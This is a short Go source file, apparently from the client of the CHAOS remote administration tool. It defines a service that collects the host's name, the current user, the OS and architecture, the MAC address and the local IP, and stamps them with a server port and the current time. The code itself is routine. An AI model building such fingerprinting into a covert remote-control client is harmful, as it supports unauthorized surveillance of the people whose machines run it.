package information

import (
	"github.com/tiagorlampert/CHAOS/client/app/entities"
	"github.com/tiagorlampert/CHAOS/client/app/services"
	"github.com/tiagorlampert/CHAOS/client/app/utilities/network"
	"os"
	"os/user"
	"runtime"
	"time"
)

type Service struct {
	ServerPort string
}

func NewService(serverPort string) services.Information {
	return &Service{ServerPort: serverPort}
}

func (i Service) LoadDeviceSpecs() (*entities.Device, error) {
	hostname, err := os.Hostname()
	if err != nil {
		return nil, err
	}
	username, err := user.Current()
	if err != nil {
		return nil, err
	}
	macAddress, err := network.GetMacAddress()
	if err != nil {
		return nil, err
	}
	return &entities.Device{
		Hostname:       hostname,
		Username:       username.Name,
		UserID:         username.Username,
		OSName:         runtime.GOOS,
		OSArch:         runtime.GOARCH,
		MacAddress:     macAddress,
		LocalIPAddress: network.GetLocalIP().String(),
		Port:           i.ServerPort,
		FetchedUnix:    time.Now().UTC().Unix(),
	}, nil
}
